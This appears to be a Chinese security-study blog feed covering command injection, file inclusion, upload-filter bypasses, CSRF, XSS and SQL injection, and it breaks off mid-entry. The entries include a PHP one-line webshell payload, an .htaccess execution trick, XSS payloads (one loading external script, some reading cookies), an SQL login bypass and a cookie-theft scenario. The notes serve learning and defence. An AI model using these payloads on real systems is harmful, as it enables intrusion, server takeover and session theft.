    <id>http://example.com/2022/04/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</id>
    <published>2022-04-15T13:03:24.014Z</published>
    <updated>2022-04-23T11:57:47.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令注入攻击"><a href="#命令注入攻击" class="headerlink" title="命令注入攻击"></a>命令注入攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul><li>代码层过滤不严</li></ul><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”);</p><ul><li>系统的漏洞造成命令注入</li></ul><p>bash破壳漏洞（CVE-2014-6271）</p><ul><li>调用的第三方组件存在代码执行漏洞</li></ul><p>如wordPress中用来处理图片的imageMagick组件<br>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）<br>ThinkPHP命令执行</p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>php代码相关<br>eval()<br>assert()<br>preg_replace<br>call_user_func()<br>call_user_func_array()<br>create_function<br>array_map()</li><li>系统命令执行相关<br>system()<br>passthru()<br>exec()<br>pcntl_exec()<br>shell_exec()<br>popen()<br>proc_open()<br>`(反单引号)<br>ob_start()</li><li>特殊函数<br>phpinfo()<br>#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息<br>symlink()：<br>#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容<br>getenv<br>#获取一个环境变量的值</li></ul><p>​       putenv($a)<br>#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态 </p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li>编码绕过</li><li>进制绕过</li><li>空格绕过</li><li><code>&gt;</code>,+绕过</li><li>关键词绕过</li><li>空变量绕过</li><li>使用花括号</li><li>长度绕过</li><li>get_defined_functions</li><li>字符数组</li><li>引号逃逸</li><li>无回显的命令执行</li><li>读文件命令</li></ul><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>继承Web服务器程序的权限，去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站，甚至控制整个服务器</li></ul><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ol><li>尽量少用执行命令的函数或者直接禁用</li><li>参数值尽量使用引号包括</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li><li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li></ol><p>参考文献：</p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/117349106">https://blog.csdn.net/LYJ20010728/article/details/117349106</a></p><p> <a href="https://www.cnblogs.com/happystudyhuan/p/11458455.html">命令执行漏洞 - 再简单一点点 - 博客园 (cnblogs.com)</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;命令注入攻击&quot;&gt;&lt;a href=&quot;#命令注入攻击&quot; class=&quot;headerlink&quot; title=&quot;命令注入攻击&quot;&gt;&lt;/a&gt;命令注入攻击&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="http://example.com/2022/04/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/04/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-04-15T13:01:26.030Z</published>
    <updated>2022-04-23T11:18:42.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 然而 PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 </p><ul><li> <strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。从而导致任意代码执行。 </li><li> <strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。 </li><li> <strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 </li><li> <strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 </li></ul><p><strong>存在漏洞的环境要求</strong></p><ul><li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li><li>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</li></ul><p><strong>常见的文件包含漏洞</strong></p><ul><li>include( )<br>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。</li><li>include_once( )<br>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次</li><li>require( )<br>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</li><li>require_once( )<br>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>本地文件包含漏洞</li></ul><p> 当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。 </p><ul><li>远程文件包含漏洞 </li></ul><p>当php.ini 中的配置选项allow_url_fopen和allow_url_include为ON的话，则包含的文件可以</p><p>是第三方服务器中的文件，这样就形成了远程文件包含漏洞。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>可以通过<strong>page=xxx</strong>来打开相应的文件，此时漏洞点就暴露出来，此时我们可以尝试打开一些私密性的文件，以 <strong>/etc/passwd</strong> 和 <strong>/var/www/phpinfo.php</strong>文件为例，只要有足够的权限，在此处就可以打开想打开的文件。 </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>大小写绕过 双写绕过等等</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>参考文献：<a href="https://blog.csdn.net/weixin_42277564/article/details/80641849">https://blog.csdn.net/weixin_42277564/article/details/80641849</a></p><p> <a href="https://blog.csdn.net/qq_42181428/article/details/87090539">(60条消息) CTF中文件包含漏洞总结_LetheSec的博客-CSDN博客_文件包含漏洞</a> </p><p> <a href="https://blog.csdn.net/weixin_43726831/article/details/102534850">(60条消息) DVWA靶机-文件包含漏洞(File Inclusion)_小边同学的博客-CSDN博客</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2022/04/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/04/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-04-15T12:59:51.781Z</published>
    <updated>2022-04-22T01:24:18.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。  文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应该没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等webshell，从而达到控制web网站的目的。</p><h2 id="文件过滤及绕过"><a href="#文件过滤及绕过" class="headerlink" title="文件过滤及绕过"></a>文件过滤及绕过</h2><h3 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h3><h4 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h4><p>如果浏览器页面没有刷新、或打开burp抓包没有抓到包、或者通过查看前端HTML代码等方式验证证明前端JS验证</p><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>简单粗暴通过删除其HTML代码对应的JS代码即可。</p><h3 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h3><h4 id="后端过滤一般用到的函数"><a href="#后端过滤一般用到的函数" class="headerlink" title="后端过滤一般用到的函数"></a>后端过滤一般用到的函数</h4><p>1、trim() 去除字符串两边的空格<br>2、deldot() 删除文件名末尾的点号<br>3、strrchr() 反向截取字符串<br>4、strtolower() 转化为小写<br>5、str_ireplace() 替换字符串中的内容<br>6、substr() 获取子字符串<br>7、strrpos() 获取字符串的位置信息<br>8、fopen() 打开文件<br>9、fread() 读取文件<br>10、unpack() 函数从二进制字符串对数据进行解包</p><h4 id="MIME类型检测绕过"><a href="#MIME类型检测绕过" class="headerlink" title="MIME类型检测绕过"></a>MIME类型检测绕过</h4><p> 当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。   </p><p><strong>绕过方法</strong></p><p>因为服务端检测的是文件的MIME类型，而对这个MIME类型的值的获取是通过HTTP请求字段里的Content-Type字段，所以绕过的方法就是通过修改Content-Type的值，比如修改为image/jpeg；image/png；image/gif等等允许上传类型对应的MIME值；</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>后端过滤函数中不包括，$file_ext = strtolower($life_ext);//转换为小写 且所有后缀名过滤都过滤</p><p><strong>绕过方法</strong></p><p>修改后缀名为大写</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>后端过滤函数中不包含，$file_ext = trim($file_ext);//首尾去空 且所有后缀名过滤都过滤</p><p><strong>绕过方法</strong></p><p>修改后缀名增加空格</p><h4 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h4><p>后端过滤函数中不包括，$file_name = deldot($file_name);//删除文件名末尾的点 且所有后缀名过滤都过滤，利用Windows特性，会自动去掉后缀名中最后的“ . ”，可在后缀名中加“ . ”绕过。</p><p><strong>绕过方法</strong></p><p>修改后缀名中增加 . 号</p><h4 id="点-空格-点-绕过"><a href="#点-空格-点-绕过" class="headerlink" title="点 空格 点 绕过"></a>点 空格 点 绕过</h4><p>保存文件的时候没有重命名而使用原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过，条件比较苛刻</p><p><strong>绕过方法</strong></p><p>修改后缀，利用 1.php. . （点+空格+点）来绕过</p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>后端处理函数中包含了 str_ireplace($deny_ext,“”,$file_name);</p><p><strong>绕过方法</strong></p><p>把后缀名更改为pphphp</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>后端采用白名单判断，但图片的路径是直接拼接出，例如： $img_path = $_GET[‘save_path’].”/“.rand(10,99).date(“YmdHis”).”.”.$file_ext;</p><p><strong>绕过方法</strong></p><p>可以利用%00截断绕过（传入save_path参数时加上）；但是有条件 截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符，而%00，是url对ascii编码再加%处理，url反编码后一样。</p><h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>通过读写文件的前2个字节判断文件类型</p><p><strong>绕过方法</strong></p><p>上传图片马</p><p>getimagesize()-图片马： 通过getimagesizi获取图片文件的类型 </p><p>exif_imagetype()-图片马：获取图片中文件的类型，需要开启php的配置文件的php_exif模块，上传图片马</p><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p> 服务器程序根据一份文件后缀名名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和黑名单里面的类型匹配，那么就禁止该文件上传 </p><p><strong>绕过方法</strong>：</p><p>①文件名大小写绕过 用像AsP、PhP之类的文件名绕过黑名单检测</p><p>②名单列表绕过 用黑名单里没有的名单进行攻击，比如黑名单里没有asa或cer之类</p><p>③特殊文件名绕过 比如发送的http包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在Windows系统里是不被允许的，所以需要在burp之类里进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但是主要Unix/Linux系统没有这个特性。</p><h4 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h4><p>文件上传成功后，经过二次渲染，所谓二次渲染就是重新在生成一次图片，容易把图片马中的PHP代码修改掉。</p><p><strong>绕过方法</strong></p><p>php代码不能放在最后，对于不同的图片，修改的位置还不一样</p><h4 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title="htaccess绕过"></a>htaccess绕过</h4><p> 黑名单里拒绝了几乎所有有问题的后缀名，除了.htaccess；前提条件httpd.conf的两个开关设置要求：(1.mod_rewrite模块开启。2.AllowOverride All) </p><p><strong>绕过方法：</strong></p><p>第一步：先上传一个.htaccess文件（该目录的所有文件可以php文件执行），内容如下： SetHandler application/x-httpd-php</p><p>第二步：然后再上传一句话木马（后缀名修改为jpg）</p><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可； 目的就是在文件还存在时执行一段php代码，比如新建一个文件，写入一句话。</p><p>代码：file_put_contents(‘webshell.php’,’<?php @eval($_POST[pass]); ?>‘);</p><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p>后端过滤函数中不包括，$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA，后端没有对后缀名中的‘::$DATA’进行过滤，在php+windows的情况下，如果文件名+“::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名. 且保持”::$DATA”之前的文件</p><p><strong>绕过方法</strong></p><p>利用Windows特性，可在后缀名中加“::$DATA”绕过</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>参考资料：<a href="https://blog.csdn.net/weixin_56218159/article/details/117536647">https://blog.csdn.net/weixin_56218159/article/details/117536647</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>跨站请求伪造CSPF</title>
    <link href="http://example.com/2022/04/15/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSPF/"/>
    <id>http://example.com/2022/04/15/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0CSPF/</id>
    <published>2022-04-15T12:22:52.117Z</published>
    <updated>2022-04-21T14:49:06.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="跨站请求伪造CSPF"><a href="#跨站请求伪造CSPF" class="headerlink" title="跨站请求伪造CSPF"></a>跨站请求伪造CSPF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>   每次我们对网站进行身份验证或登录时，会话 cookie 都会存储在浏览器中。因此，每当我们向网站提出请求时，这些 cookie 就会自动发送到服务器，服务器通过匹配与服务器记录一起发送的 cookie 来识别我们。<br>       CSRF 攻击通常以链接的形式出现。我们可以在其他网站上点击它们或通过电子邮件接收它们。单击这些链接时，会向服务器发出不需要的恶意请求，而服务器认为我们发出了这个请求并对其进行了身份验证，然后攻击者就可以借用用户的名义做坏事啦~  </p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h3><h3 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h3><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>​    </p><p>1、 抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞<br>2、 如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。<br>3、 利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li> 检查Referer字段 ： HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。  但也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。 </li><li>  添加校验token ： 这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。 </li><li>SameSite Cookie属性：谷歌提出了same-site cookies概念，same-site cookies 是基于 Chrome 和 Mozilla 开发者花了三年多时间制定的 IETF 标准。它是在原有的Cookie中，新添加了一个SameSite属性，它标识着在非同源的请求中，是否可以带上Cookie</li></ol><p>参考资料：<a href="https://blog.csdn.net/abu935009066/article/details/114366771">https://blog.csdn.net/abu935009066/article/details/114366771</a></p><p><a href="https://blog.csdn.net/whoim_i/article/details/103171778">https://blog.csdn.net/whoim_i/article/details/103171778</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;跨站请求伪造CSPF&quot;&gt;&lt;a href=&quot;#跨站请求伪造CSPF&quot; class=&quot;headerlink&quot; title=&quot;跨站请求伪造CSPF&quot;&gt;&lt;/a&gt;跨站请求伪造CSPF&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>跨站脚本攻击xss</title>
    <link href="http://example.com/2022/04/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/"/>
    <id>http://example.com/2022/04/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/</id>
    <published>2022-04-15T11:57:10.333Z</published>
    <updated>2022-05-16T14:24:30.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="跨站脚本攻击xss"><a href="#跨站脚本攻击xss" class="headerlink" title="跨站脚本攻击xss"></a>跨站脚本攻击xss</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击。 </p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>  存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie </p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>  非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。 </p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p> 不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 </p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li><li>搜索框</li></ul><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p> 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。 </p><p> 也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。 </p><p> 同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。 </p><h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><h3 id="攻击载荷"><a href="#攻击载荷" class="headerlink" title="攻击载荷"></a>攻击载荷</h3><script>标签：<script>标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中    -----------------------------     <script>alert("hello")</script>   #弹出hello<pre><code> &lt;script&gt;alert(/hello/)&lt;/script&gt;   #弹出hello &lt;script&gt;alert(1)&lt;/script&gt;        #弹出1,对于数字可以不用引号 &lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie &lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss------------------------------</code></pre><p> <svg>标签：<br/>    ——————————<br/>     <svg onload="alert(1)"><br/>     &lt;svg onload=”alert(1)”//<br/>    ——————————<br/> <img/>标签：<br/>    ——————————<br/>     &lt;img  src=1  οnerrοr=alert(“hack”)&gt;<br/>     &lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie<br/>    ——————————</svg></svg></p><body>标签：    ------------------------------     <body οnlοad="alert(1)">     <body οnpageshοw="alert(1)">    ------------------------------<video>标签：    ------------------------------     <video οnlοadstart="alert(1)" src="/media/hack-the-planet.mp4">    ------------------------------<Style>标签：    ------------------------------     <style οnlοad=alert(1)>    ------------------------------<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol><li>大小写绕过</li><li>双写型 &lt;sc&lt; script&gt;ript&gt;alert(“x”);&lt;/ script&gt; </li><li>换标签，比如过滤了script，就试一试img</li><li></li></ol><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>1直接输入<script>alert(‘huihui’)</script>查看是否能实现攻击</p><p><img src="/E:/git-blog\source\images\1652710965877.png" alt="1652710965877"></p><p>​                                <img src="/E:/git-blog\source\images\1652711020631.png" alt="1652711020631"></p><p>2.2.发现并没有弹窗出现，查看源代码，发现页面对script标签做了替换过滤</p><p>  <img src="/E:/git-blog\source\images\1652711034616.png" alt="1652711034616"></p><p>2.3尝试用大小写绕过</p><p>  <img src="/E:/git-blog\source\images\1652711044713.png" alt="1652711044713"></p><p>2.4发现弹窗成功</p><p><img src="/E:/git-blog\source\images\1652711063984.png" alt="1652711063984"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h3 id="DOM型XSS-1"><a href="#DOM型XSS-1" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发现一个网站存在反射型XSS，当用户登录该网站时，我们通过诱使用户点击我们精心制作的恶意链接，来盗取用户的Cookie并且发送给我们，然后我们再利用盗取的Cookie以用户的身份登录该用户的网站。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>参考文献： <a href="https://blog.csdn.net/weixin_40950781/article/details/100007103">(58条消息) DVWA学习之XSS（跨站脚本攻击）（超级详细）_litchi125的博客-CSDN博客_dvwa xss</a> </p></Style></video></video></body></body></body>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;跨站脚本攻击xss&quot;&gt;&lt;a href=&quot;#跨站脚本攻击xss&quot; class=&quot;headerlink&quot; title=&quot;跨站脚本攻击xss&quot;&gt;&lt;/a&gt;跨站脚本攻击xss&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://example.com/2022/04/15/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/04/15/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-15T11:02:19.737Z</published>
    <updated>2022-05-17T08:16:52.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一-SQL注入原理"><a href="#一-SQL注入原理" class="headerlink" title="一.SQL注入原理"></a>一.SQL注入原理</h2><p>  web 应用程序对用户输入的数据合法性没有过滤或者是判断，<strong>前端传入的参数</strong>是攻击者可以控制，并且**参数带入数据库的查询 **，攻击者可以通过构造恶意的 sql 语句来实现对数据库的任意操作。例如一般用户登录用的SQL语句为：SELECT * FROM user WHERE username=’admin’ AND password=’passwd’，此处admin和passwd分别为用户输入的用户名和密码，如果程序员没有对用户输入的用户名和密码做处理，就可以构造万能密码成功绕过登录验证，如用户输入’or 1#,SQL语句将变为：SELECT * FROM user WHERE username=’’or 1#’ AND password=’’，‘’or 1为TRUE，#注释掉后面的内容，所以查询语句可以正确执行。</p><p> sql注入漏洞攻击流程：注入点探测—信息获取—获取权限</p><h2 id="二-数据库"><a href="#二-数据库" class="headerlink" title="二.数据库"></a>二.数据库</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库，在该库中，我们需要记住三个表名，分别是 schemata，tables，columns。</p><ul><li>Schemata 表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为 schema_name。</li><li>Tables 表存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema 和 table_name</li><li>Columns 表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、。</li></ul><h2 id="三-重要函数"><a href="#三-重要函数" class="headerlink" title="三.重要函数"></a>三.重要函数</h2><ul><li><p>Version()；当前 mysql 的版本</p></li><li><p> Database();当前网站使用的数据库</p></li><li><p>User();当前 MySQL 的用户</p></li><li><p> system_user(); 系统用户名</p></li><li><p>session_user();连接数据库的用户名</p></li><li><p>current_user;当前用户名</p></li><li><p>load_file();读取本地文件</p></li><li><p>length(str) : 返回给定字符串的长度，如 length(“string”)=6</p></li><li><p>substr(string,start,length) : 